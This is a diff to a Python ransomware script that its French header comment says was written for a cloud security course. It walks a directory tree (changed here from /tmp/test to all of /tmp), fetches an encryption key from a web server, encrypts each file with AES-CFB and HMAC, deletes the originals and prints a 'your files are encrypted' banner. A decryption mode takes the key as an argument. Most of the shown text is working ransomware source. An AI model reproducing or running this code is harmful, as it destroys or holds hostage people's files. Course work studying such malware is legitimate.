@@ -1,5 +1,11 @@
 # -*- coding: utf-8 -*-
 
+#==========================================
+#Ce code est un ransomware qui a été développé
+# dans le cadre de l'enseignement CYB_5101A - 
+# Sécurité CLoud.
+#==========================================
+
 from path import Path
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -15,10 +21,11 @@ parser = argparse.ArgumentParser(description="Ransomware qui peut chiffrer et d�
 parser.add_argument("-d", "--dechiffre", type=str ,help="pour effectuéer le déchiffrement, il faut ajouter la clé en paramètre")
 args = parser.parse_args()
 
+
 def get_file(dossier='.'):
     #==========================================
     #Cette fonction permet de récupérer le path de 
-    # l'ensemble des fichier présent dans le dossier
+    # l'ensemble des fichiers présent dans le dossier
     # courant et tous les sous-dossiers
     #==========================================
     files = []
@@ -26,6 +33,7 @@ def get_file(dossier='.'):
     for f in Path(dossier).walkfiles():
         files.append(f)
     return files
+
 
 def get_key():
     #==========================================
@@ -37,6 +45,7 @@ def get_key():
     if (response.status_code == requests.codes.ok):
         #On change le format de la page web pour enlever les ''
         return str(response.content)[1:].replace('\'', '')
+
 
 def suppression(path):
     #==========================================
@@ -53,7 +62,7 @@ def chiffrement(fichiers,cle):
     #Fonction qui va s'occuper du chiffrement 
     # avec AES-256 (quelque soit la taille du
     # mot de passe) en mode CFB de tous les fichiers
-    # passé en paramètre avec la clé fournit.
+    # passés en paramètre avec la clé fournit.
     #==========================================
     sel     =   cle[::-1]
     kdf     =   PBKDF2(cle,sel,64, 1000)
@@ -80,6 +89,10 @@ def chiffrement(fichiers,cle):
             fout.write(mac.digest())
             fout.write(iv)
             fout.write(chiffre)
+    del sel
+    del kdf
+    del cle
+    del cle_mac
 
 
 def dechiffrement(fichiers,cle):
@@ -87,7 +100,7 @@ def dechiffrement(fichiers,cle):
     #Fonction qui va s'occuper du déchiffrement 
     # avec AES-256 (quelque soit la taille de la
     # clé) en mode CFB de tous les fichiers
-    # passé en paramètre avec la clé fournit.
+    # passés en paramètre avec la clé fournit.
     #==========================================
     sel     =   cle[::-1]
     kdf     =   PBKDF2(cle,sel,64, 1000)
@@ -98,11 +111,11 @@ def dechiffrement(fichiers,cle):
     mac = HMAC.new(cle_mac) #calculé par défautl en MD5
 
     for f in fichiers:
-        #extraction des données du fichier chiffré
+        #Extraction des données du fichier chiffré
         with open(f,'rb') as fin:
             data    =   fin.read()
 
-        #récupération du HMAC et génération du HMAC pour faire la conparaison
+        #Récupération du HMAC et génération du HMAC pour faire la conparaison
         verifie =   data[0:16]
         mac.update(data[16:])
 
@@ -120,6 +133,12 @@ def dechiffrement(fichiers,cle):
         with open(f[:-4],'xb') as fout:
             fout.write(dechiffre)
 
+    del sel
+    del kdf
+    del cle
+    del cle_mac
+
+
 def signature(text):
     #==========================================
     #Signature du ransomware.
@@ -127,21 +146,22 @@ def signature(text):
     result = pyfiglet.figlet_format(text, font = "isometric1")
     print(result)
 
+
 def main():
     #==========================================
     #Fonction main du ransomware
     #==========================================
     if args.dechiffre == None:
-        fichier = get_file('/tmp/test') #création de la table contenant tout les noms fichiers
+        fichier = get_file('/tmp')      #création de la table contenant tout les noms fichiers
         chiffrement(fichier,get_key())  #Chiffrement de tous les fichiers avec la clé récupéré
-        suppression(fichier)           #Suppresion de tous les fichiers non chiffrés
+        suppression(fichier)            #Suppresion de tous les fichiers non chiffrés
         signature("Tous vos fichiers ont été chiffré")
 
     else:
-        fichier =   get_file('/tmp/test')
-        print(args.dechiffre)
+        fichier =   get_file('/tmp')
         dechiffrement(fichier,args.dechiffre)
         suppression(fichier)
+        signature("Success")
 
 
 if __name__ == "__main__":
